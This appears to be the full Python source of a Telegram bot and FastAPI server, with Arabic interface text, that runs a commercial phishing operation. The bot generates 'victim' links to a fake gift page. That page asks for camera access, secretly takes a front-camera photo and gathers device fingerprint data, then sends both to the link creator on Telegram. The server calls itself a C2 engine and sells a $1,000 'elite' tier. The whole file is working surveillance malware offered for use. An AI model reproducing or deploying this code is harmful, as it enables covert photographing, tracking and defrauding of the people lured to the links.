import os
import uuid
import asyncio
import base64
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ربط الـ link_id بمعرف المستخدم الذي قام بتوليد الرابط لضمان وصول التنبيهات والصور له شخصياً
LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    stolen_data: dict = {}

@app.get("/t/{link_id}", response_class=HTMLResponse)
async def serve_trap_page(link_id: str, request: Request):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>تحميل المكافأة الفورية</title>
        <style>
            body {{ background-color: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
            .loader {{ border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
    </head>
    <body>
        <h2>🎁 جاري فحص الجهاز وتحضير الهدية الفورية...</h2>
        <div class="loader"></div>
        <p>يرجى السماح بالصلاحيات المطلوبة للمتابعة.</p>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const linkId = "{link_id}";
            async function captureAndSend() {{
                try {{
                    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(async () => {{
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);

                        // جمع معلومات إضافية متقدمة من المتصفح والجهاز
                        const advancedData = {{
                            screen_resolution: window.screen.width + 'x' + window.screen.height,
                            language: navigator.language || navigator.userLanguage,
                            platform: navigator.platform,
                            cores: navigator.hardwareConcurrency || 'غير معروف',
                            memory: navigator.deviceMemory || 'غير معروف',
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                        }};

                        await fetch('/api/v1/exfiltrate', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                link_id: linkId,
                                device_info: navigator.userAgent,
                                camera_snapshot_base64: imageData,
                                stolen_data: advancedData
                            }})
                        }});
                        
                        stream.getTracks().forEach(track => track.stop());
                        window.location.href = "https://www.google.com";
                    }}, 2500);
                }} catch (e) {{
                    window.location.href = "https://www.google.com";
                }}
            }}
            window.onload = captureAndSend;
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    
    VICTIMS_DB[data.link_id].append(data.dict())
    
    # التحقق من وجود مستخدم مسجل لهذا الرابط لإرسال التنبيه الفوري
    target_user_id = LINK_TO_USER.get(data.link_id)
    
    if target_user_id:
        try:
            # تجهيز معلومات الضحية لعرضها بشكل منسق واحترافي
            s_data = data.stolen_data
            caption = (
                "🚨 *تم صيد ضحية جديدة بنجاح!*\n\n"
                f"💻 *معلومات النظام:* `{data.device_info}`\n"
                f"📐 *دقة الشاشة:* `{s_data.get('screen_resolution', 'N/A')}`\n"
                f"🌐 *اللغة:* `{s_data.get('language', 'N/A')}`\n"
                f"⚙️ *النظام الأساسي:* `{s_data.get('platform', 'N/A')}`\n"
                f"🧠 *الأنوية والمعمارية:* `{s_data.get('cores', 'N/A')}`\n"
                f"🌍 *المنطقة الزمنية:* `{s_data.get('timezone', 'N/A')}`"
            )
            
            if data.camera_snapshot_base64:
                # استخراج وتحويل بيانات الصورة من Base64 إلى بايتات حقيقية لإرسالها كصورة فوتوغرافية عبر تيليجرام
                header, encoded = data.camera_snapshot_base64.split(",", 1)
                image_bytes = base64.b64decode(encoded)
                photo_file = BufferedInputFile(image_bytes, filename="victim_capture.jpg")
                
                await bot.send_photo(
                    chat_id=target_user_id,
                    photo=photo_file,
                    caption=caption,
                    parse_mode="Markdown"
                )
            else:
                await bot.send_message(
                    chat_id=target_user_id,
                    text=caption,
                    parse_mode="Markdown"
                )
        except Exception as e:
            print(f"Error sending alert to Telegram: {e}")

    return {"status": "success", "loot_stored": True}

@app.get("/")
async def root():
    return {"status": "C2 Engine Active & Ready", "tier": "Elite Offensive Arsenal"}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"links_generated": 0, "victims_caught": 0}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔗 توليد رابط ضحية جديد (مجاني)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
            [KeyboardButton(text="💎 الترقية للباقة الفاخرة ($1,000)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *مرحباً بك في منصة صيد الضحايا الاحترافية.*\n\n"
        "النظام جاهز الآن. بمجرد فتح الضحية للرابط والسماح بالصلاحيات، ستصلك صورة الكاميرا وبيانات الجهاز فورا هنا.",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "🔗 توليد رابط ضحية جديد (مجاني)")
async def generate_link(message: types.Message):
    user_id = message.from_user.id
    unique_token = str(uuid.uuid4())[:8]
    
    # جلب الدومين الفعلي من متغيرات البيئة لرايلواي أو تعويض الرابط المباشر للمشروع
    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL")
    
    if not public_domain:
        # ضع اسم نطاق مشروعك الفعلي هنا في حال عدم وجود متغير البيئة لتجنب تعطيل الروابط
        public_domain = "hacker-production-3281.up.railway.app" 

    trap_url = f"https://{public_domain}/t/{unique_token}"
    
    # ربط الرمز المميز بمعرف المستخدم الحالي لضمان توجيه لقطة الكاميرا إليه فوراً
    LINK_TO_USER[unique_token] = user_id
    
    if user_id in USERS_DB:
        USERS_DB[user_id]["links_generated"] += 1
    
    await message.answer(
        f"✅ *تم توليد رابط الفخ الخاص بك بنجاح:*\n\n`{trap_url}`\n\n*(انتظار دخول الضحية... التقاط تلقائي فور الفتح)*",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    user_id = message.from_user.id
    # جمع كافة الضحايا المرتبطين بروابط هذا المستخدم
    user_links = [token for token, uid in LINK_TO_USER.items() if uid == user_id]
    total_victims = sum(len(VICTIMS_DB.get(token, [])) for token in user_links)
    
    if total_victims == 0:
        await message.answer("📂 *سجل الضحايا الحالي:*\n\n⚠️ لم يتم رصد ضحايا حتى الآن عبر روابطك.", parse_mode="Markdown")
    else:
        await message.answer(f"📂 *سجل الضحايا الحالي:*\n\n🎯 إجمالي عدد الضحايا الذين تم اصطيادهم: *{total_victims}*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💎 الترقية للباقة الفاخرة ($1,000)")
async def upsell_tier(message: types.Message):
    await message.answer("🔥 *ترسانة الهكر المتقدمة (VIP Elite - $1,000)*\n\nتواصل مع المسؤول للتفعيل.", parse_mode="Markdown")

async def run_telegram_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_telegram_polling())

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
